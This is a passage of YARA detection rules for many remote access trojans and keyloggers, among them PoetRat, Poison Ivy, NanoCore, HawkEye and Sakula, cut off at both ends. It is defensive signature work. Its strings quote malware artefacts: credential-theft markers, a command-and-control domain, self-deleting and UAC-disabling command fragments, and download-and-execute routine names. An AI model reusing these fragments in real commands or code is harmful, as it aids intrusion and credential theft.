process.\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=/\\\\AppData\\\\Roaming\\\\[0-9]{9,12}\\VMwareCplLauncher\\.exe/\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"\\\\Windows\\\\System32\\\\rundll32.exe\"\n\n\t\t$type2=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid2=\"4688\"\n\t\t$data2=\"Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n\tcondition:\n\t\tall of them\n}\n\n\nrule PoetRat_Doc\n{\n    meta:\n        Author = \"Nishan Maharjan\"\n        Description = \"A yara rule to catch PoetRat Word Document\"\n        Data = \"6th May 2020\"\n    strings:\n        $pythonRegEx = /(\\.py$|\\.pyc$|\\.pyd$|Python)/  // checking for python strings\n\n        // Python file strings in the word documents\n        $pythonFile1 = \"launcher.py\"\n        $zipFile = \"smile.zip\"\n        $pythonFile2 = \"smile_funs.py\"\n        $pythonFile3 = \"frown.py\"\n        $pythonFile4 = \"backer.py\"\n        $pythonFile5 = \"smile.py\"\n        $pythonFile6 = \"affine.py\" \n\n        // dlls and cmd strings\n        $dlls = /\\.dll/\n        $cmd = \"cmd\"\n        $exe = \".exe\"   \n    condition:\n    all of them        \n}\n\nrule PoetRat_Python\n{\n    meta:\n        Author = \"Nishan Maharjan\"\n        Description = \"A yara rule to catch PoetRat python scripts\"\n        Data = \"6th May 2020\"\n    strings:\n\n        // Any of the strings that stand out in the files, these are for the multiple python files, not just for a single file\n        $encrptionFunction = \"Affine\"\n        $commands = /version|ls|cd|sysinfo|download|upload|shot|cp|mv|link|register|hid|compress|jobs|exit|tasklist|taskkill/\n        $domain = \"dellgenius.hopto.org\"\n        $grammer_massacre = /BADD|Bad Error Happened|/\n        $mayBePresent = /self\\.DIE|THE_GUID_KEY/\n        $pipe_out = \"Abibliophobia23\"\n        $shot = \"shot_{0}_{1}.png\"\n    condition:\n        3 of them        \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule poisonivy_1 : rat\n{\n\tmeta:\n\t\tdescription = \"Poison Ivy\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-02-01\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py\"\n\n\tstrings:\n\t\t$a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C 6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63 74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C } \n\t\t\n\tcondition:\n\t\t$a\n}\n\nrule PoisonIvy_Generic_3 {\n\tmeta:\n\t\tdescription = \"PoisonIvy RAT Generic Rule\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-05-14\"\n\t\thash = \"e1cbdf740785f97c93a0a7a01ef2614be792afcd\"\n\tstrings:\n\t\t$k1 = \"Tiger324{\" fullword ascii\n\t\t\n\t\t$s2 = \"WININET.dll\" fullword ascii\n\t\t$s3 = \"mscoree.dll\" fullword wide\n\t\t$s4 = \"WS2_32.dll\" fullword\n\t\t$s5 = \"Explorer.exe\" fullword wide\n\t\t$s6 = \"USER32.DLL\"\n\t\t$s7 = \"CONOUT$\"\n\t\t$s8 = \"login.asp\"\n\t\t\n\t\t$h1 = \"HTTP/1.0\"\n\t\t$h2 = \"POST\"\n\t\t$h3 = \"login.asp\"\n\t\t$h4 = \"check.asp\"\n\t\t$h5 = \"result.asp\"\n\t\t$h6 = \"upload.asp\"\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and\n\t\t\t( \n\t\t\t\t$k1 or all of ($s*) or all of ($h*)\n\t\t\t)\n}\nrule PoisonIvy_2\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PoisonIvy\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n    strings:\n    \t$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}\n        $string1 = \"CONNECT %s:%i HTTP/1.0\"\n        $string2 = \"ws2_32\"\n        $string3 = \"cks=u\"\n        $string4 = \"thj@h\"\n        $string5 = \"advpack\"\n    condition:\n\t\t$stub at 0x1620 and all of ($string*) or (all of them)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.\n*/\n\nrule AAR : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/AAR\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"Hashtable\"\n\t\t$b = \"get_IsDisposed\"\n\t\t$c = \"TripleDES\"\n\t\t$d = \"testmemory.FRMMain.resources\"\n\t\t$e = \"$this.Icon\" wide\n\t\t$f = \"{11111-22222-20001-00001}\" wide\n\t\t$g = \"@@@@@\"\n\n\tcondition:\n\t\tall of them\n}\n\nrule Ap0calypse: RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Ap0calypse\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"Ap0calypse\"\n\t\t$b = \"Sifre\"\n\t\t$c = \"MsgGoster\"\n\t\t$d = \"Baslik\"\n\t\t$e = \"Dosyalars\"\n\t\t$f = \"Injecsiyon\"\n\n\tcondition:\n\t\tall of them\n}\n\nrule Arcom : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Arcom\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n        $a1 = \"CVu3388fnek3W(3ij3fkp0930di\"\n        $a2 = \"ZINGAWI2\"\n        $a3 = \"clWebLightGoldenrodYellow\"\n        $a4 = \"Ancestor for '%s' not found\" wide\n        $a5 = \"Control-C hit\" wide\n        $a6 = {A3 24 25 21}\n        \n    condition:\n        all of them\n}\n\nrule Bandook : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/bandook\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n    \t\t$a = \"aaaaaa1|\"\n            $b = \"aaaaaa2|\"\n            $c = \"aaaaaa3|\"\n            $d = \"aaaaaa4|\"\n\t\t\t$e = \"aaaaaa5|\"\n\t\t\t$f = \"%s%d.exe\"\n\t\t\t$g = \"astalavista\"\n\t\t\t$h = \"givemecache\"\n\t\t\t$i = \"%s\\\\system32\\\\drivers\\\\blogs\\\\*\"\n\t\t\t$j = \"bndk13me\"\n\t\t\t\n\n        \n    condition:\n    \t\tall of them\n}\n\nrule BlackNix : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/BlackNix\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n\t\t$a1 = \"SETTINGS\" wide\n\t\t$a2 = \"Mark Adler\"\n\t\t$a3 = \"Random-Number-Here\"\n\t\t$a4 = \"RemoteShell\"\n\t\t$a5 = \"SystemInfo\"\n\n\t\n\tcondition:\n\t\tall of them\n}\nrule BlueBanana : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/BlueBanana\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"Java\"\n\n\tstrings:\n\t\t$meta = \"META-INF\"\n\t\t$conf = \"config.txt\"\n\t\t$a = \"a/a/a/a/f.class\"\n\t\t$b = \"a/a/a/a/l.class\"\n\t\t$c = \"a/a/a/b/q.class\"\n\t\t$d = \"a/a/a/b/v.class\"\n\n\t\t\n\tcondition:\n\t\tall of them\n}\nrule ClientMesh : RAT\n{\n    meta:\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/06\"\n        ref = \"http://malwareconfig.com/stats/ClientMesh\"\n        family = \"torct\"\n\n    strings:\n        $string1 = \"machinedetails\"\n        $string2 = \"MySettings\"\n        $string3 = \"sendftppasswords\"\n        $string4 = \"sendbrowserpasswords\"\n        $string5 = \"arma2keyMass\"\n        $string6 = \"keylogger\"\n        $conf = {00 00 00 00 00 00 00 00 00 7E}\n\n    condition:\n        all of them\n}\nrule DarkRAT : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/DarkRAT\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"@1906dark1996coder@\"\n\t\t$b = \"SHEmptyRecycleBinA\"\n\t\t$c = \"mciSendStringA\"\n\t\t$d = \"add_Shutdown\"\n\t\t$e = \"get_SaveMySettingsOnExit\"\n\t\t$f = \"get_SpecialDirectories\"\n\t\t$g = \"Client.My\"\n\n\tcondition:\n\t\tall of them\n}\nrule Greame : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Greame\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\t\t\n\tstrings:\n    \t\t$a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}\n            $b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}\n            $c = \"EditSvr\"\n            $d = \"TLoader\"\n\t\t\t$e = \"Stroks\"\n            $f = \"Avenger by NhT\"\n\t\t\t$g = \"####@####\"\n\t\t\t$h = \"GREAME\"\n\t\t\t\n    condition:\n    \t\tall of them\n}\nrule HawkEye : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2015/06\"\n\t\tref = \"http://malwareconfig.com/stats/HawkEye\"\n\t\tmaltype = \"KeyLogger\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$key = \"HawkEyeKeylogger\" wide\n\t\t$salt = \"099u787978786\" wide\n\t\t$string1 = \"HawkEye_Keylogger\" wide\n\t\t$string2 = \"holdermail.txt\" wide\n\t\t$string3 = \"wallet.dat\" wide\n\t\t$string4 = \"Keylog Records\" wide\n        $string5 = \"<!-- do not script -->\" wide\n        $string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"BSPLIT\" wide\n        \n\n\tcondition:\n\t\t$key and $salt and all of ($string*)\n}\nrule Imminent : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/Imminent\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n    condition:\n        all of ($v1*) or all of ($v2*)\n}\nrule Infinity : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Infinity\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"CRYPTPROTECT_PROMPTSTRUCT\"\n\t\t$b = \"discomouse\"\n\t\t$c = \"GetDeepInfo\"\n\t\t$d = \"AES_Encrypt\"\n\t\t$e = \"StartUDPFlood\"\n\t\t$f = \"BATScripting\" wide\n\t\t$g = \"FBqINhRdpgnqATxJ.html\" wide\n\t\t$i = \"magic_key\" wide\n\n\tcondition:\n\t\tall of them\n}\nrule JavaDropper : RAT\n{\n    meta:\n\t    author = \" Kevin Breen <kevin@techanarchy.net>\"\n\t    date = \"2015/10\"\n\t    ref = \"http://malwareconfig.com/stats/AlienSpy\"\n\t    maltype = \"Remote Access Trojan\"\n\t    filetype = \"jar\"\n\n    strings:\n\t    $jar = \"META-INF/MANIFEST.MF\"\n\n\t    $a1 = \"ePK\"\n\t    $a2 = \"kPK\"\n\n        $b1 = \"config.ini\"\n        $b2 = \"password.ini\"\n\n        $c1 = \"stub/stub.dll\"\n\n        $d1 = \"c.dat\"\n\n    condition:\n        $jar and (all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*))\n}\nrule LostDoor : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/LostDoor\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n        \n    strings:\n    \t$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}\n        $a1 = \"*mlt* = %\"\n        $a2 = \"*ip* = %\"\n        $a3 = \"*victimo* = %\"\n        $a4 = \"*name* = %\"\n        $b5 = \"[START]\"\n        $b6 = \"[DATA]\"\n        $b7 = \"We Control Your Digital World\" wide ascii\n        $b8 = \"RC4Initialize\" wide ascii\n        $b9 = \"RC4Decrypt\" wide ascii\n        \n    condition:\n    \tall of ($a*) or all of ($b*)\n}\nrule LuminosityLink : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/LuminosityLink\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"SMARTLOGS\" wide\n        $b = \"RUNPE\" wide\n        $c = \"b.Resources\" wide\n        $d = \"CLIENTINFO*\" wide\n        $e = \"Invalid Webcam Driver Download URL, or Failed to Download File!\" wide\n        $f = \"Proactive Anti-Malware has been manually activated!\" wide\n        $g = \"REMOVEGUARD\" wide\n        $h = \"C0n1f8\" wide\n        $i = \"Luminosity\" wide\n        $j = \"LuminosityCryptoMiner\" wide\n        $k = \"MANAGER*CLIENTDETAILS*\" wide\n\n    condition:\n        all of them\n}\nrule LuxNet : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/LuxNet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"GetHashCode\"\n\t\t$b = \"Activator\"\n\t\t$c = \"WebClient\"\n\t\t$d = \"op_Equality\"\n\t\t$e = \"dickcursor.cur\" wide\n\t\t$f = \"{0}|{1}|{2}\" wide\n\n\tcondition:\n\t\tall of them\n}\nrule NanoCore : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/NanoCore\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"NanoCore\"\n        $b = \"ClientPlugin\"\n        $c = \"ProjectData\"\n        $d = \"DESCrypto\"\n        $e = \"KeepAlive\"\n        $f = \"IPNETROW\"\n        $g = \"LogClientMessage\"\n\t\t$h = \"|ClientHost\"\n\t\t$i = \"get_Connected\"\n\t\t$j = \"#=q\"\n        $key = {43 6f 24 cb 95 30 38 39}\n\n\n    condition:\n        6 of them\n}\n\t\nrule Paradox : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Paradox\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"ParadoxRAT\"\n\t\t$b = \"Form1\"\n\t\t$c = \"StartRMCam\"\n\t\t$d = \"Flooders\"\n\t\t$e = \"SlowLaris\"\n\t\t$f = \"SHITEMID\"\n\t\t$g = \"set_Remote_Chat\"\n\n\tcondition:\n\t\tall of them\n}\nrule Plasma : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/Plasma\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $a = \"Miner: Failed to Inject.\" wide\n        $b = \"Started GPU Mining on:\" wide\n        $c = \"BK: Hard Bot Killer Ran Successfully!\" wide\n        $d = \"Uploaded Keylogs Successfully!\" wide\n        $e = \"No Slowloris Attack is Running!\" wide\n        $f = \"An ARME Attack is Already Running on\" wide\n        $g = \"Proactive Bot Killer Enabled!\" wide\n        $h = \"PlasmaRAT\" wide ascii\n        $i = \"AntiEverything\" wide ascii\n\n    condition:\n        all of them\n}\nrule PredatorPain : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PredatorPain\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = \"holderwb.txt\" wide\n\t\t$string3 = \"There is a file attached to this email\" wide\n\t\t$string4 = \"screens\\\\screenshot\" wide\n\t\t$string5 = \"Disablelogger\" wide\n\t\t$string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"clearie\" wide\n        $string8 = \"clearff\" wide\n        $string9 = \"emails should be sent to you shortly\" wide\n        $string10 = \"jagex_cache\\\\regPin\" wide\n        $string11 = \"open=Sys.exe\" wide\n\t\t$ver1 = \"PredatorLogger\" wide\n\t\t$ver2 = \"EncryptedCredentials\" wide\n        $ver3 = \"Predator Pain\" wide\n\n\tcondition:\n\t\t7 of ($string*) and any of ($ver*)\n}\nrule Punisher : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Punisher\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"abccba\"\n\t\t$b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}\n\t\t$c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}\n\t\t$d = \"SpyTheSpy\" wide ascii\n\t\t$e = \"wireshark\" wide\n\t\t$f = \"apateDNS\" wide\n\t\t$g = \"abccbaDanabccb\"\n\n\tcondition:\n\t\tall of them\n}\nrule PythoRAT : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/PythoRAT\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"TKeylogger\"\n\t\t$b = \"uFileTransfer\"\n\t\t$c = \"TTDownload\"\n\t\t$d = \"SETTINGS\"\n\t\t$e = \"Unknown\" wide\n\t\t$f = \"#@#@#\"\n\t\t$g = \"PluginData\"\n\t\t$i = \"OnPluginMessage\"\n\n\tcondition:\n\t\tall of them\n}\nrule QRat : RAT\n{\n    meta:\n        author = \"Kevin Breen @KevTheHermit\"\n        date = \"2015/08\"\n        ref = \"http://malwareconfig.com\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"jar\"\n        \n    strings:\n        $a0 = \"e-data\"\n        $a1 = \"quaverse/crypter\"\n        $a2 = \"Qrypt.class\"\n        $a3 = \"Jarizer.class\"\n        $a4 = \"URLConnection.class\"\n        \n        \n    condition:\n        4 of them\n\n\n}\nrule SmallNet : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/SmallNet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\t\t\n\tstrings:\n\t\t$split1 = \"!!<3SAFIA<3!!\"\n\t\t$split2 = \"!!ElMattadorDz!!\"\n\t\t$a1 = \"stub_2.Properties\"\n\t\t$a2 = \"stub.exe\" wide\n\t\t$a3 = \"get_CurrentDomain\"\n\n\tcondition:\n\t\t($split1 or $split2) and (all of ($a*))\n}\nrule SpyGate : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/SpyGate\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$split = \"abccba\"\n\t\t$a1 = \"abccbaSpyGateRATabccba\" //$a = Version 0.2.6\n\t\t$a2 = \"StubX.pdb\" \n\t\t$a3 = \"abccbaDanabccb\"\n\t\t$b1 = \"monikerString\" nocase //$b = Version 2.0\n\t\t$b2 = \"virustotal1\"\n\t\t$b3 = \"get_CurrentDomain\"\n\t\t$c1 = \"shutdowncomputer\" wide //$c = Version 2.9\n\t\t$c2 = \"shutdown -r -t 00\" wide\n\t\t$c3 = \"set cdaudio door closed\" wide\n\t\t$c4 = \"FileManagerSplit\" wide\n\t\t$c5 = \"Chating With >> [~Hacker~]\" wide\n\n\tcondition:\n\t\t(all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))\n}\nrule Sub7Nation : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Sub7Nation\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"EnableLUA /t REG_DWORD /d 0 /f\"\n\t\t$b = \"*A01*\"\n\t\t$c = \"*A02*\"\n\t\t$d = \"*A03*\"\n\t\t$e = \"*A04*\"\t\n\t\t$f = \"*A05*\"\n\t\t$g = \"*A06*\"\n\t\t$h = \"#@#@#\"\n\t\t$i = \"HostSettings\"\n\t\t$verSpecific1 = \"sevane.tmp\"\n\t\t$verSpecific2 = \"cmd_.bat\"\n\t\t$verSpecific3 = \"a2b7c3d7e4\"\n\t\t$verSpecific4 = \"cmd.dll\"\n\n\t\t\n\tcondition:\n\t\tall of them\n}\nrule UPX : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\n\tstrings:\n\t\t$a = \"UPX0\"\n\t\t$b = \"UPX1\"\n\t\t$c = \"UPX!\"\n\n\tcondition:\n\t\tall of them\n}\nrule Vertex : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Vertex\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = \"DEFPATH\"\n\t\t$string2 = \"HKNAME\"\n\t\t$string3 = \"HPORT\"\n\t\t$string4 = \"INSTALL\"\n\t\t$string5 = \"IPATH\"\n\t\t$string6 = \"MUTEX\"\n\t\t$res1 = \"PANELPATH\"\n\t\t$res2 = \"ROOTURL\"\n\n\tcondition:\n\t\tall of them\n}\nrule VirusRat : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/VirusRat\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string0 = \"virustotal\"\n\t\t$string1 = \"virusscan\"\n\t\t$string2 = \"abccba\"\n\t\t$string3 = \"pronoip\"\n\t\t$string4 = \"streamWebcam\"\n\t\t$string5 = \"DOMAIN_PASSWORD\"\n\t\t$string6 = \"Stub.Form1.resources\"\n\t\t$string7 = \"ftp://{0}@{1}\" wide\n\t\t$string8 = \"SELECT * FROM moz_logins\" wide\n\t\t$string9 = \"SELECT * FROM moz_disabledHosts\" wide\n\t\t$string10 = \"DynDNS\\\\Updater\\\\config.dyndns\" wide\n\t\t$string11 = \"|BawaneH|\" wide\n\n\tcondition:\n\t\tall of them\n}\nrule unrecom : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/AAR\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$meta = \"META-INF\"\n\t\t$conf = \"load/ID\"\n\t\t$a = \"load/JarMain.class\"\n\t\t$b = \"load/MANIFEST.MF\"\n        $c = \"plugins/UnrecomServer.class\"\n\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule sakula_v1_0: RAT\n{\n    meta:\n        description = \"Sakula v1.0\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n                $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of ($m*) and not $v1_1\n}\n\nrule sakula_v1_1: RAT\n{\n    meta:\n        description = \"Sakula v1.1\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n                $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}\n\nrule sakula_v1_2: RAT\n{\n    meta:\n        description = \"Sakula v1.2\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $v1_2 = \"CCPUpdate\"\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and $m1 and $m2 and $m3 and $v1_2 and not $v1_1\n}\n\nrule sakula_v1_3: RAT\n{\n    meta:\n        description = \"Sakula v1.3\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n\n        $v1_3 = { 81 3E 78 03 00 00 75 57  8D 54 24 14 52 68 0C 05 41 00 68 01 00 00 80 FF  15 00 F0 40 00 85 C0 74 10 8B 44 24 14 68 2C 31  41 00 50 FF 15 10 F0 40 00 8B 4C 24 14 51 FF 15  24 F0 40 00 E8 0F 09 00 }\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}\n\nrule sakula_v1_4: RAT\n{\n    meta:\n        description = \"Sakula v1.4\"\n        date = \"2015-10-13\"\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n\n        $v1_4 = { 50 E8 CD 